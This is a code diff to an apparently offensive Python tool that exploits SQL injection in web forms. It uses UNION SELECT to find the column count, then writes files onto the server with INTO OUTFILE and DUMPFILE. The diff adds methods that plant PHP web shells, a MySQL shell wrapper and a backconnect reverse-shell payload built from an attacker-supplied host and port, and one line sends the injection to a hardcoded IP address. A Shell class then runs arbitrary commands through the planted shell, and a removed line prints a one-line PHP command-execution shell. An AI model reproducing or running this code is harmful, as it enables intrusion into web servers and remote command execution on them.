@@ -28,10 +28,10 @@ class Injector:
         if not self.checkBit("1=1"):
             raise InjectionError
 
-    def post(self, data):
+    def post(self, data, url=None):
         req = None
         timeouts = 0
-        url = urllib.parse.urlunparse(self.url).replace("///", "//")
+        url = urllib.parse.urlunparse(self.url).replace("///", "//") if url is None else url
         
         while req is None:
             if timeouts == MAX_TIMEOUTS:
@@ -42,7 +42,7 @@ class Injector:
                 timeouts += 1
         return req.read().decode(req.headers.get_content_charset())
 
-    def runInjection(self, inj):
+    def runInjection(self, inj, url=None):
         time.sleep(self.delay)
         data = self.other_fields.copy()
         data[self.attack_field] = inj
@@ -105,19 +105,48 @@ class Injector:
         nulls = ", NULL"*(num-1)
         return num if self.runInjection("' UNION SELECT 1%s -- '" % nulls) else self.getNumCols(num+1)
 
+    def getUrlRoot(self):
+        return "%s://%s/" % (self.url.scheme, (self.url.netloc+self.url.path).split("/")[0])
 
-    def injectPHPShell(self, webroot, filename="index2.php"):
-        urlroot = "%s://%s/" % (self.url.scheme, (self.url.netloc+self.url.path).split("/")[0])
-        numCols = self.getNumCols()
-        php = '<?php system($_REQUEST[\"a\"]) ?>'
+    def injectStringAsFile(self, contents, filepath):
+        nulls = ', NULL'*(self.getNumCols()-1)
+        inj = "'UNION SELECT '%s'%s INTO OUTFILE '%s' FIELDS ESCAPED BY '' -- '" % (contents.rstrip(), nulls, filepath)
+        self.runInjection(inj, "http://152.7.99.212/injection2.php")
+
+    def injectFile(self, filename, target_filepath):
+        with open(filename, 'r') as f:
+            self.injectStringAsFile(f.read(), target_filepath)
+
+    def injectBinFile(self, filename, target_filepath):
+        with open(filename, 'rb') as f:
+            a = list(f.read())
+            b = ''.join("%02x" % x for x in a)
+            nulls = ", X'00'"*(self.getNumCols()-1)
+            inj = "'UNION SELECT X'%s'%s INTO DUMPFILE '%s' -- '" % (b, nulls, target_filepath)
+            self.runInjection(inj)
+
+    def injectBackconnect(self, filename, target_filepath, host, port):
+        with open(filename, 'r') as f:
+            a = f.read().replace("<HOST>", host).replace("<PORT>", port)
+            self.injectStringAsFile(a, target_filepath)
+
+    def injectMySQLShell(self, webroot, host, username, password, database, filename="index3.php"):
+        with open('./shell-wrappers/php-mysql.php', 'r') as f:
+            contents = f.read()
+            contents = contents.replace("<HOST>", host)
+            contents = contents.replace("<USERNAME>", username)
+            contents = contents.replace("<PASSWORD>", password)
+            contents = contents.replace("<DATABASE>", database)
+            self.injectStringAsFile(contents, webroot+filename)
+        return Shell(self.getUrlRoot(), filename, self.getNumCols())
+
+    def injectShell(self, webroot, filename="index2.php"):
         filepath = webroot + filename
-        nulls = ', NULL'*(numCols-1)
-        inj = "' UNION SELECT '%s'%s INTO OUTFILE '%s' -- '" % (php, nulls, filepath)
-        self.runInjection(inj)
-        return PHPShell(urlroot, filename, numCols)
+        self.injectFile('./shell-wrappers/php-web.php', filepath)
+        return Shell(self.getUrlRoot(), filename, self.getNumCols())
 
 
-class PHPShell:
+class Shell:
 
     promptCmd = "echo [$USER@${HOSTNAME%%.*} ${PWD##*/}]"
     timeoutResponse = "[bitdump] Request timed out!\n"
@@ -128,32 +157,32 @@ class PHPShell:
         self.shellURL = urlroot+filename
         self.endPad = (numCols*-3)+2
         self.basePrompt = " "
-        self.cwd = self.executeRaw("pwd")
-        while self.cwd == PHPShell.timeoutResponse:
-            self.cwd = self.executeRaw("pwd")
+        self.cwd = self.executeRaw("pwd").rstrip()
+        while self.cwd == Shell.timeoutResponse:
+            self.cwd = self.executeRaw("pwd").rstrip()
         
 
     def prompt(self):
         prompt = self.execute(":")
-        if prompt == PHPShell.timeoutResponse:
+        if prompt == Shell.timeoutResponse:
             prompt = "# "
         self.basePrompt = prompt
         return prompt
 
     def execute(self, cmd):
-        cmd = "cd %s; %s; %s; pwd" % (self.cwd, cmd, PHPShell.promptCmd)
+        cmd = "cd %s; %s; %s; pwd" % (self.cwd, cmd, Shell.promptCmd)
         try:
             req = urllib.request.urlopen(urllib.request.Request(self.shellURL, urllib.parse.urlencode({"a": cmd}).encode('ascii')), timeout=TIMEOUT);
         except (socket.timeout, urllib.error.URLError):
-            return PHPShell.timeoutResponse+self.basePrompt
-        response = req.read().decode(req.headers.get_content_charset())[:self.endPad]
+            return Shell.timeoutResponse+self.basePrompt
+        response = req.read().decode(req.headers.get_content_charset())
         spl = response.rsplit("\n", 2)
-        self.cwd = spl[1]
+        self.cwd = spl[1] 
         return spl[0]+"$ "
 
     def executeRaw(self, cmd):
         try:
             req = urllib.request.urlopen(urllib.request.Request(self.shellURL, urllib.parse.urlencode({"a": cmd}).encode('ascii')), timeout=TIMEOUT);
         except (socket.timeout, urllib.error.URLError):
-            return PHPShell.timeoutResponse
-        return req.read().decode(req.headers.get_content_charset())[:self.endPad-1]
+            return Shell.timeoutResponse
+        return req.read().decode(req.headers.get_content_charset())
